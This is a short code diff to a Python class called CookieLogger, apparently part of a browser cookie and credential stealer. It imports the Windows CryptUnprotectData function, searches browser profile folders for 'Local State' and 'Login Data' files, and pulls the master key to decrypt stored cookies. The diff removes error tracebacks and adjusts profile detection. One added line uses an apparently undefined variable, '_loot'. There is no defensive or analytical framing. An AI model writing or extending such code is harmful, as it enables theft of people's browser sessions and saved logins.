@@ -5,9 +5,7 @@ import json
 import base64
 import shutil
 import sqlite3
-import io
 import requests
-import traceback
 import subprocess
 
 from win32crypt import CryptUnprotectData
@@ -64,8 +62,10 @@ class CookieLogger:
                             if file == "Local State":
                                 if "Default" in os.listdir(_root):
                                     found.append([_root, True])
+                                elif "Login Data" in os.listdir(_root):
+                                    found.append([_loot, False])
                                 else:
-                                    found.append([_root, False])
+                                    pass
                 except Exception:
                     pass
 
@@ -105,7 +105,6 @@ class CookieLogger:
         try:
             masterKey = self.getMasterKey(browserPath)
         except Exception:
-            traceback.print_exc()
             return cookiesFound
 
         if isProfiled:
